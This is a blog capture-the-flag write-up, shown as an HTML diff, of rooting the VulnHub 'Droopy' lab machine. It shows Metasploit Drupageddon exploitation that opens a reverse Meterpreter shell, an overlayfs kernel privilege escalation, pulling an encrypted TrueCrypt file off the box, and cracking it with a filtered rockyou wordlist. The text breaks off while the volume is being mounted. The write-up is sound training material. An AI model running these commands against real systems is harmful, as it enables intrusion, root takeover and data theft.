@@ -1,0 +1,995 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Dropping Droopy - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Droopy writeup">
+  <meta name="keywords" content="droopy, droopy 0.2, droopy vulnhub, vulnhub, pentest lab, hacking lab, ctf, drupal exploit, drupageddon, truecrack, truecrypt cracking">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Dropping Droopy</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-05-04T13:05:08-04:00" pubdate data-updated="true">May 4<span>th</span>, 2018</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>
+
+<p>1.) Grab a copy of the rockyou wordlist.</p>
+
+<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</span><span class='line'>|_http-generator: Drupal 7 (http://drupal.org)
+</span><span class='line'>| http-robots.txt: 36 disallowed entries (15 shown)
+</span><span class='line'>| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+</span><span class='line'>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+</span><span class='line'>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+</span><span class='line'>|_/LICENSE.txt /MAINTAINERS.txt
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like this will be a web-based challenge.</p>
+
+<p><img class="center" src="/images/pentest/droopy.png" title="droopy" alt="droopy"></p>
+
+<p>There are quite a few entries inside robots.txt:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
+</span><span class='line'>Crawl-delay: 10
+</span><span class='line'># Directories
+</span><span class='line'>Disallow: /includes/
+</span><span class='line'>Disallow: /misc/
+</span><span class='line'>Disallow: /modules/
+</span><span class='line'>Disallow: /profiles/
+</span><span class='line'>Disallow: /scripts/
+</span><span class='line'>Disallow: /themes/
+</span><span class='line'># Files
+</span><span class='line'>Disallow: /CHANGELOG.txt
+</span><span class='line'>Disallow: /cron.php
+</span><span class='line'>Disallow: /INSTALL.mysql.txt
+</span><span class='line'>Disallow: /INSTALL.pgsql.txt
+</span><span class='line'>Disallow: /INSTALL.sqlite.txt
+</span><span class='line'>Disallow: /install.php
+</span><span class='line'>Disallow: /INSTALL.txt
+</span><span class='line'>Disallow: /LICENSE.txt
+</span><span class='line'>Disallow: /MAINTAINERS.txt
+</span><span class='line'>Disallow: /update.php
+</span><span class='line'>Disallow: /UPGRADE.txt
+</span><span class='line'>Disallow: /xmlrpc.php
+</span><span class='line'># Paths (clean URLs)
+</span><span class='line'>Disallow: /admin/
+</span><span class='line'>Disallow: /comment/reply/
+</span><span class='line'>Disallow: /filter/tips/
+</span><span class='line'>Disallow: /node/add/
+</span><span class='line'>Disallow: /search/
+</span><span class='line'>Disallow: /user/register/
+</span><span class='line'>Disallow: /user/password/
+</span><span class='line'>Disallow: /user/login/
+</span><span class='line'>Disallow: /user/logout/
+</span><span class='line'># Paths (no clean URLs)
+</span><span class='line'>Disallow: /?q=admin/
+</span><span class='line'>Disallow: /?q=comment/reply/
+</span><span class='line'>Disallow: /?q=filter/tips/
+</span><span class='line'>Disallow: /?q=node/add/
+</span><span class='line'>Disallow: /?q=search/
+</span><span class='line'>Disallow: /?q=user/password/
+</span><span class='line'>Disallow: /?q=user/register/
+</span><span class='line'>Disallow: /?q=user/login/
+</span><span class='line'>Disallow: /?q=user/logout/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/drupal_drupageddon
+</span><span class='line'>msf exploit(drupal_drupageddon) &gt; info
+</span><span class='line'>
+</span><span class='line'>       Name: Drupal HTTP Parameter Key/Value SQL Injection
+</span><span class='line'>     Module: exploit/multi/http/drupal_drupageddon
+</span><span class='line'>   Platform: PHP
+</span><span class='line'>       Arch: php
+</span><span class='line'> Privileged: No
+</span><span class='line'>    License: Metasploit Framework License (BSD)
+</span><span class='line'>       Rank: Excellent
+</span><span class='line'>  Disclosed: 2014-10-15
+</span><span class='line'>
+</span><span class='line'>Provided by:
+</span><span class='line'>  SektionEins
+</span><span class='line'>  Christian Mehlmauer &lt;FireFart@gmail.com&gt;
+</span><span class='line'>  Brandon Perry
+</span><span class='line'>
+</span><span class='line'>Available targets:
+</span><span class='line'>  Id  Name
+</span><span class='line'>  --  ----
+</span><span class='line'>  0   Drupal 7.0 - 7.31
+</span><span class='line'>
+</span><span class='line'>Basic options:
+</span><span class='line'>  Name       Current Setting  Required  Description
+</span><span class='line'>  ----       ---------------  --------  -----------
+</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class='line'>  RHOST      192.168.217.139  yes       The target address
+</span><span class='line'>  RPORT      80               yes       The target port (TCP)
+</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span><span class='line'>  TARGETURI  /                yes       The target URI of the Drupal installation
+</span><span class='line'>  VHOST                       no        HTTP server virtual host
+</span><span class='line'>
+</span><span class='line'>Payload information:
+</span><span class='line'>
+</span><span class='line'>Description:
+</span><span class='line'>  This module exploits the Drupal HTTP Parameter Key/Value SQL 
+</span><span class='line'>  Injection (aka Drupageddon) in order to achieve a remote shell on 
+</span><span class='line'>  the vulnerable instance. This module was tested against Drupal 7.0 
+</span><span class='line'>  and 7.31 (was fixed in 7.32).
+</span><span class='line'>
+</span><span class='line'>References:
+</span><span class='line'>  https://cvedetails.com/cve/CVE-2014-3704/
+</span><span class='line'>  https://www.drupal.org/SA-CORE-2014-005
+</span><span class='line'>  http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
+</span><span class='line'>msf exploit(drupal_drupageddon) &gt; exploit
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:4444 
+</span><span class='line'>[*] Testing page
+</span><span class='line'>[*] Creating new user yCTZcwgtLV:WLhkIYdDtB
+</span><span class='line'>[*] Logging in as yCTZcwgtLV:WLhkIYdDtB
+</span><span class='line'>[*] Trying to parse enabled modules
+</span><span class='line'>[*] Enabling the PHP filter module
+</span><span class='line'>[*] Setting permissions for PHP filter module
+</span><span class='line'>[*] Getting tokens from create new article page
+</span><span class='line'>[*] Calling preview page. Exploit should trigger...
+</span><span class='line'>[*] Sending stage (37543 bytes) to 192.168.217.139
+</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:4444 -&gt; 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I dropped into a shell and checked the kernel version:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
+</span><span class='line'>Process 1385 created.
+</span><span class='line'>Channel 0 created.
+</span><span class='line'>uname -a
+</span><span class='line'>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python linux_privcheck.py 
+</span><span class='line'>Kernel version is 3.13
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: Double-free usb-midi SMEP Local Privilege Escalation
+</span><span class='line'>CVE: CVE-2016-2384
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/41999/
+</span><span class='line'>###########################################
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: overlayfs Privilege Escalation
+</span><span class='line'>CVE: CVE-2015-1328
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/37292/
+</span><span class='line'>###########################################
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: ptrace/sysret Privilege Escalation
+</span><span class='line'>CVE: CVE-2014-4699
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/34134/
+</span><span class='line'>###########################################
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
+</span><span class='line'>CVE: N/A
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38390/
+</span><span class='line'>###########################################
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: b43 Wireless Driver Privilege Escalation
+</span><span class='line'>CVE: CVE-2013-2852
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38559/
+</span><span class='line'>###########################################
+</span><span class='line'>###########################################
+</span><span class='line'>POTENTIALLY VULNERABLE TO
+</span><span class='line'>Name: open-time Capability file_ns_capable() Privilege Escalation
+</span><span class='line'>CVE: CVE-2013-1959
+</span><span class='line'>Source code: https://www.exploit-db.com/exploits/25450/
+</span><span class='line'>###########################################</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; upload /root/37292.c /tmp/
+</span><span class='line'>[*] uploading  : /root/37292.c -&gt; /tmp/
+</span><span class='line'>[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gcc 37292.c -o overlayfs
+</span><span class='line'>chmod +x overlayfs
+</span><span class='line'>./overlayfs
+</span><span class='line'>spawning threads
+</span><span class='line'>mount #1
+</span><span class='line'>mount #2
+</span><span class='line'>child threads done
+</span><span class='line'>/etc/ld.so.preload created
+</span><span class='line'>creating shared library
+</span><span class='line'>sh: 0: can't access tty; job control turned off
+</span><span class='line'># whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat www-data
+</span><span class='line'>From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
+</span><span class='line'>Date: 14 Apr 2016 04:34:39 +0100
+</span><span class='line'>From: Dave &lt;dave@droopy.example.com&gt;
+</span><span class='line'>Subject: rockyou with a nice hat!
+</span><span class='line'>Message-ID: &lt;730262568@example.com&gt;
+</span><span class='line'>X-IMAP: 0080081351 0000002016
+</span><span class='line'>Status: NN
+</span><span class='line'>
+</span><span class='line'>George,
+</span><span class='line'>
+</span><span class='line'>   I've updated the encrypted file... You didn't leave any
+</span><span class='line'>hints for me. The password isn't longer than 11 characters
+</span><span class='line'>and anyway, we know what academy we went to, don't you...?
+</span><span class='line'>
+</span><span class='line'>I'm sure you'll figure it out it won't rockyou too much!
+</span><span class='line'>
+</span><span class='line'>If you are still struggling, remember that song by The Jam
+</span><span class='line'>
+</span><span class='line'>Later,
+</span><span class='line'>Dave</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>
+
+<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /usr/share/wordlists/rockyou.txt 
+</span><span class='line'>14344392 /usr/share/wordlists/rockyou.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>I made a new file with only the entries that were 11 characters long:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
+</span><span class='line'>wc -l rocked.txt 
+</span><span class='line'>865891 rocked.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>grep academy rocked.txt &gt; rockademy.txt
+</span><span class='line'>wc -l rockademy.txt 
+</span><span class='line'>16 rockademy.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download /tmp/dave.tc
+</span><span class='line'>[*] Downloading: /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
+</span><span class='line'>[*] download   : /tmp/dave.tc -&gt; dave.tc</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>
+
+<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
+and it is optimized for Nvidia Cuda technology. It supports:</p>
+
+<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
+and Whirlpool.
+   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
+SERPENT, TWOFISH.
+   File-hosted (container) and Partition/device-hosted.
+   Hidden volumes and Backup headers.</p>
+
+<p>TrueCrack is able to perform a brute-force attack based on:</p>
+
+<p>   Dictionary: read the passwords from a file of words.
+   Alphabet: generate all passwords of given length from given alphabet.</p>
+
+<p>TrueCrack works on gpu and cpu</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack
+</span><span class='line'>TrueCrack v3.0
+</span><span class='line'>Website: http://code.google.com/p/truecrack
+</span><span class='line'>Contact us: infotruecrack@gmail.com
+</span><span class='line'>Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
+</span><span class='line'>Based on TrueCrypt, freely available at http://www.truecrypt.org/
+</span><span class='line'>Copyright (c) 2011 by Luca Vaccaro.
+</span><span class='line'>
+</span><span class='line'>Usage:
+</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -w &lt;wordlist_file&gt; [-b &lt;parallel_block&gt;]
+</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -c &lt;charset&gt; [-s &lt;minlength&gt;] -m &lt;maxlength&gt; [-b &lt;parallel_block&gt;]
+</span><span class='line'>
+</span><span class='line'>Options:
+</span><span class='line'> -h --help                        Display this information.
+</span><span class='line'> -t --truecrypt &lt;truecrypt_file&gt;    Truecrypt volume file.
+</span><span class='line'> -k --key &lt;ripemd160 | sha512 | whirlpool&gt;      Key derivation function (default ripemd160).
+</span><span class='line'> -b --blocksize &lt;parallel_blocks&gt;       Number of parallel computations (board dependent).
+</span><span class='line'> -w --wordlist &lt;wordlist_file&gt;      File of words, for Dictionary attack.
+</span><span class='line'> -c --charset &lt;alphabet&gt;        Alphabet generator, for Alphabet attack.
+</span><span class='line'> -s --startlength &lt;minlength&gt;       Starting length of passwords, for Alphabet attack (default 1).
+</span><span class='line'> -m --maxlength &lt;maxlength&gt;     Maximum length of passwords, for Alphabet attack.
+</span><span class='line'> -r --restore &lt;number&gt;          Restore the computation.
+</span><span class='line'> -v --verbose                     Show computation messages.
+</span><span class='line'>
+</span><span class='line'>Sample:
+</span><span class='line'> Dictionary mode: truecrack --truecrypt ./volume --wordlist ./dictionary.txt 
+</span><span class='line'> Charset mode: truecrack --truecrypt ./volume --charset ./dictionary.txt --maxlength 10</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt 
+</span><span class='line'>TrueCrack v3.0
+</span><span class='line'>Website: http://code.google.com/p/truecrack
+</span><span class='line'>Contact us: infotruecrack@gmail.com
+</span><span class='line'>Found password:       "etonacademy"
+</span><span class='line'>Password length:  "12"
+</span><span class='line'>Total computations:   "10"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It worked! Now all that remains is to open the volume and snoop around:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup open --type tcrypt dave.tc hidden
+</span><span class='line'>Enter passphrase: 
+</span><span class='line'>mkdir -p /mnt/tcrypt
+</span><span class='line'>mount /dev/mapper/hidden /mnt/tcrypt/
+</span><span class='line'>root@kali:/mnt/tcrypt# ls -la
+</span><span class='line'>total 20
